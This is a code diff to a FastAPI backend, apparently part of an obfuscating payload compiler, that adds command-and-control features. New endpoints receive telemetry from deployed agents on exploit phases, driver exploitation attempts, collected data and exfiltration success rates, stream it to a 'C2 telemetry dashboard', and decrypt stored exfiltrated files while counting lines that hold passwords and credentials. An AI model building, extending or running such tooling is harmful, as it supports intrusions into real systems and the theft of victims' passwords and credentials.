@@ -1,12 +1,14 @@
 import asyncio
 import os
-from datetime import datetime
+import json
+from datetime import datetime, timedelta
 from pathlib import Path
 from typing import Optional
+from collections import deque
 
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Request
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import FileResponse
+from fastapi.responses import FileResponse, HTMLResponse
 from pydantic import BaseModel, Field, field_validator, ConfigDict
 
 from compiler import create_job, get_job, run_compilation, JobStatus
@@ -14,7 +16,7 @@ from report import get_enabled_passes
 from runtime_apis import RUNTIME_APIS
 from obfuscation import MLIR_PASSES, LLVM_PASSES
 from demo_scripts import WINDOWS_DEMO, LINUX_DEMO
-from database import init_db, save_job, get_job_record, list_jobs
+from database import init_db, save_job, get_job_record, list_jobs, SessionLocal, save_telemetry_event, get_telemetry_events, cleanup_old_telemetry, TelemetryEvent
 from metrics import create_metric, get_metric, get_all_metrics
 from example_projects import get_example, list_examples
 
@@ -44,8 +46,62 @@ app.add_middleware(
 @app.on_event("startup")
 async def startup_event():
     init_db()
+    asyncio.create_task(telemetry_cleanup_task())
 
 ws_connections: dict[str, list[WebSocket]] = {}
+telemetry_ws_connections: dict[str, list[WebSocket]] = {}
+telemetry_cache: dict[str, deque] = {}  # chain_id -> deque of last 100 events
+
+
+async def telemetry_cleanup_task():
+    while True:
+        try:
+            db = SessionLocal()
+            cleanup_old_telemetry(db, hours=24)
+            db.close()
+            await asyncio.sleep(3600)  # Run every hour
+        except Exception as e:
+            print(f"Telemetry cleanup error: {e}")
+            await asyncio.sleep(60)
+
+
+class TelemetryEventRequest(BaseModel):
+    timestamp: str
+    chain_id: str
+    event_type: str
+    phase: Optional[int] = None
+    status: Optional[str] = None
+    details: Optional[dict] = None
+
+
+class TelemetryEventResponse(BaseModel):
+    id: int
+    timestamp: str
+    chain_id: str
+    event_type: str
+    phase: Optional[int]
+    status: Optional[str]
+    details_json: Optional[str]
+    received_at: str
+
+
+class TelemetryChainTimeline(BaseModel):
+    chain_id: str
+    events: list[TelemetryEventResponse]
+    total_events: int
+
+
+class TelemetrySummary(BaseModel):
+    chain_id: str
+    current_phase: int
+    phases_completed: int
+    drivers_attempted: int
+    drivers_successful: int
+    data_collected_bytes: int
+    exfil_success_rate: float
+    execution_time_seconds: Optional[int]
+    first_event_timestamp: Optional[str]
+    last_event_timestamp: Optional[str]
 
 
 class MLIRConfig(BaseModel):
@@ -317,6 +373,93 @@ async def websocket_logs(websocket: WebSocket, job_id: str):
             ws_connections.pop(job_id, None)
 
 
+async def broadcast_telemetry_event(chain_id: str, event: dict):
+    """Broadcast telemetry event to all connected WebSocket clients for this chain"""
+    conns = telemetry_ws_connections.get(chain_id, [])
+    dead = []
+    for ws in conns:
+        try:
+            await ws.send_json({"event": event})
+        except Exception:
+            dead.append(ws)
+    for ws in dead:
+        conns.remove(ws)
+
+
+@app.websocket("/ws/telemetry/{chain_id}")
+async def websocket_telemetry(websocket: WebSocket, chain_id: str):
+    """
+    WebSocket endpoint for live telemetry streaming.
+
+    On connection, sends last 50 events as history, then streams new events in real-time.
+
+    Example (JavaScript):
+    ```javascript
+    const ws = new WebSocket('ws://localhost:8000/ws/telemetry/chain_abc123');
+    ws.onmessage = (msg) => {
+      const data = JSON.parse(msg.data);
+      console.log('Telemetry event:', data.event);
+    };
+    ```
+    """
+    await websocket.accept()
+
+    if chain_id not in telemetry_ws_connections:
+        telemetry_ws_connections[chain_id] = []
+    telemetry_ws_connections[chain_id].append(websocket)
+
+    try:
+        # Send last 50 events as history (from cache if available, else from DB)
+        if chain_id in telemetry_cache and telemetry_cache[chain_id]:
+            history = list(telemetry_cache[chain_id])
+        else:
+            db = SessionLocal()
+            try:
+                events = get_telemetry_events(db, chain_id, limit=50)
+                history = [
+                    {
+                        "id": e.id,
+                        "timestamp": e.timestamp,
+                        "chain_id": e.chain_id,
+                        "event_type": e.event_type,
+                        "phase": e.phase,
+                        "status": e.status,
+                        "details_json": e.details_json,
+                        "received_at": e.received_at.isoformat(),
+                    }
+                    for e in reversed(events)
+                ]
+            finally:
+                db.close()
+
+        await websocket.send_json({
+            "type": "history",
+            "events": history,
+            "count": len(history),
+        })
+
+        # Keep connection open to receive new events
+        while True:
+            await websocket.receive_text()
+    except WebSocketDisconnect:
+        pass
+    finally:
+        conns = telemetry_ws_connections.get(chain_id, [])
+        if websocket in conns:
+            conns.remove(websocket)
+        if not conns:
+            telemetry_ws_connections.pop(chain_id, None)
+
+
+@app.get("/dashboard")
+async def get_dashboard():
+    """Serve the C2 telemetry dashboard"""
+    dashboard_path = Path(__file__).parent.parent / "dashboard.html"
+    if dashboard_path.exists():
+        return FileResponse(str(dashboard_path), media_type="text/html")
+    raise HTTPException(status_code=404, detail="Dashboard not found")
+
+
 @app.get("/api/config", response_model=ConfigResponse)
 async def get_config():
     """Get backend configuration for frontend"""
@@ -326,6 +469,182 @@ async def get_config():
         obfuscation_presets=["none", "light", "standard", "aggressive"],
         docs_url="/docs",
     )
+
+
+@app.post("/api/telemetry/report", response_model=TelemetryEventResponse)
+async def report_telemetry(request: TelemetryEventRequest):
+    """
+    Receive telemetry event from deployed agent/binary.
+
+    Example:
+    ```bash
+    curl -X POST http://localhost:8000/api/telemetry/report \
+      -H "Content-Type: application/json" \
+      -d '{
+        "timestamp": "2024-10-10T12:34:56Z",
+        "chain_id": "chain_abc123",
+        "event_type": "phase_start",
+        "phase": 1,
+        "status": "running",
+        "details": {"driver": "ntfs", "method": "exploit"}
+      }'
+    ```
+    """
+    db = SessionLocal()
+    try:
+        details_json = json.dumps(request.details) if request.details else None
+        event = save_telemetry_event(
+            db,
+            chain_id=request.chain_id,
+            timestamp=request.timestamp,
+            event_type=request.event_type,
+            phase=request.phase,
+            status=request.status,
+            details_json=details_json,
+        )
+
+        # Add to in-memory cache for fast WebSocket delivery
+        if request.chain_id not in telemetry_cache:
+            telemetry_cache[request.chain_id] = deque(maxlen=100)
+
+        event_dict = {
+            "id": event.id,
+            "timestamp": event.timestamp,
+            "chain_id": event.chain_id,
+            "event_type": event.event_type,
+            "phase": event.phase,
+            "status": event.status,
+            "details_json": event.details_json,
+            "received_at": event.received_at.isoformat(),
+        }
+        telemetry_cache[request.chain_id].append(event_dict)
+
+        # Broadcast to any listening WebSocket clients
+        await broadcast_telemetry_event(request.chain_id, event_dict)
+
+        return TelemetryEventResponse(**event_dict)
+    finally:
+        db.close()
+
+
+@app.get("/api/telemetry/chain/{chain_id}", response_model=TelemetryChainTimeline)
+async def get_chain_timeline(chain_id: str, limit: int = 50):
+    """
+    Get full execution timeline for a chain.
+
+    Example:
+    ```bash
+    curl http://localhost:8000/api/telemetry/chain/chain_abc123?limit=50
+    ```
+    """
+    db = SessionLocal()
+    try:
+        events = get_telemetry_events(db, chain_id, limit=limit)
+        event_responses = [
+            TelemetryEventResponse(
+                id=e.id,
+                timestamp=e.timestamp,
+                chain_id=e.chain_id,
+                event_type=e.event_type,
+                phase=e.phase,
+                status=e.status,
+                details_json=e.details_json,
+                received_at=e.received_at.isoformat(),
+            )
+            for e in reversed(events)  # Return in chronological order
+        ]
+        return TelemetryChainTimeline(
+            chain_id=chain_id,
+            events=event_responses,
+            total_events=len(event_responses),
+        )
+    finally:
+        db.close()
+
+
+@app.get("/api/telemetry/summary", response_model=TelemetrySummary)
+async def get_telemetry_summary(chain_id: str):
+    """
+    Get summary statistics for a chain's execution.
+
+    Calculates:
+    - Current phase (highest phase_start)
+    - Phases completed (count of phase_complete events)
+    - Drivers attempted/successful
+    - Data collected (bytes)
+    - Exfil success rate
+    - Total execution time
+
+    Example:
+    ```bash
+    curl http://localhost:8000/api/telemetry/summary?chain_id=chain_abc123
+    ```
+    """
+    db = SessionLocal()
+    try:
+        events = db.query(TelemetryEvent).filter(TelemetryEvent.chain_id == chain_id).order_by(TelemetryEvent.received_at).all()
+
+        current_phase = 0
+        phases_completed = 0
+        drivers_attempted = 0
+        drivers_successful = 0
+        data_collected = 0
+        exfil_success = 0
+        exfil_total = 0
+        first_timestamp = None
+        last_timestamp = None
+
+        for event in events:
+            if event.timestamp and not first_timestamp:
+                first_timestamp = event.timestamp
+            if event.timestamp:
+                last_timestamp = event.timestamp
+
+            if event.event_type == "phase_start" and event.phase:
+                current_phase = max(current_phase, event.phase)
+            elif event.event_type == "phase_complete":
+                phases_completed += 1
+            elif event.event_type == "driver_attempt":
+                drivers_attempted += 1
+            elif event.event_type == "driver_success":
+                drivers_successful += 1
+            elif event.event_type == "data_collected" and event.details_json:
+                try:
+                    details = json.loads(event.details_json)
+                    data_collected += details.get("bytes", 0)
+                except:
+                    pass
+            elif event.event_type == "exfil_attempt":
+                exfil_total += 1
+            elif event.event_type == "exfil_success":
+                exfil_success += 1
+
+        exfil_rate = (exfil_success / exfil_total * 100) if exfil_total > 0 else 0.0
+
+        execution_time = None
+        if first_timestamp and last_timestamp:
+            try:
+                from dateutil.parser import isoparse
+                first = isoparse(first_timestamp)
+                last = isoparse(last_timestamp)
+                execution_time = int((last - first).total_seconds())
+            except:
+                pass
+
+        return TelemetrySummary(
+            chain_id=chain_id,
+            current_phase=current_phase,
+            phases_completed=phases_completed,
+            drivers_attempted=drivers_attempted,
+            drivers_successful=drivers_successful,
+            data_collected_bytes=data_collected,
+            exfil_success_rate=exfil_rate,
+            execution_time_seconds=execution_time,
+            first_event_timestamp=first_timestamp,
+            last_event_timestamp=last_timestamp,
+        )
+    finally:
+        db.close()
 
 
 @app.post("/api/validate-source", response_model=ErrorReport)
@@ -685,6 +1004,49 @@ async def list_exfil():
     EXFIL_DIR.mkdir(exist_ok=True)
     files = sorted(EXFIL_DIR.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
     return [{"name": f.name, "size": f.stat().st_size, "mtime": datetime.utcfromtimestamp(f.stat().st_mtime).isoformat()} for f in files]
+
+
+@app.get("/api/exfil/all")
+async def get_all_exfil_decrypted():
+    """Get all exfil files with decrypted contents for dashboard display."""
+    EXFIL_DIR.mkdir(exist_ok=True)
+    files = sorted(EXFIL_DIR.glob("exfil_*.txt"), key=lambda p: p.stat().st_mtime, reverse=True)
+
+    exfil_data = []
+    for filepath in files:
+        try:
+            ciphertext = filepath.read_bytes()
+            plaintext = _decode_exfil(ciphertext)
+
+            # Parse content to extract key data types
+            lines = plaintext.split('\n')
+            passwords = [l for l in lines if 'password' in l.lower() or 'passwd' in l.lower()]
+            credentials = [l for l in lines if 'credential' in l.lower()]
+            paths = [l for l in lines if '\\' in l or '/' in l]
+
+            exfil_data.append({
+                "filename": filepath.name,
+                "size": filepath.stat().st_size,
+                "mtime": datetime.utcfromtimestamp(filepath.stat().st_mtime).isoformat(),
+                "plaintext": plaintext,
+                "summary": {
+                    "total_lines": len(lines),
+                    "password_lines": len(passwords),
+                    "credential_lines": len(credentials),
+                    "path_lines": len(paths),
+                },
+                "preview": plaintext[:500] if len(plaintext) > 500 else plaintext
+            })
+        except Exception as e:
+            exfil_data.append({
+                "filename": filepath.name,
+                "size": filepath.stat().st_size,
+                "mtime": datetime.utcfromtimestamp(filepath.stat().st_mtime).isoformat(),
+                "error": str(e),
+                "plaintext": None
+            })
+
+    return {"exfil_files": exfil_data, "total": len(exfil_data)}
 
 
 if __name__ == "__main__":
